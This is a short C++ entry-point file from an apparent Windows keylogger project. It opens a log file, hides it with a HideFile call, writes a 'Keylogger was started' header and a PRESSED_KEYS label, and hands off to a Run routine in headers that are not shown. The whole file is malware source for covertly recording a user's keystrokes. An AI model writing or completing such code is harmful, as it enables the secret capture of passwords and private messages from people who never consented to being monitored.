#include "Headers.h"
#include "Keylogger.h"
#include "Commonfunctional.h"

void main(void)
{
	SetConsoleCP(1251);
	SetConsoleOutputCP(1251);

	ofstream out;

	out.open(logkl, ios::app);
	HideFile(logkl);

	out << endl; OutFullData(out); out << "Keylogger was started."; out << endl << "\nPRESSED_KEYS: "; out.close();

	Run();
}
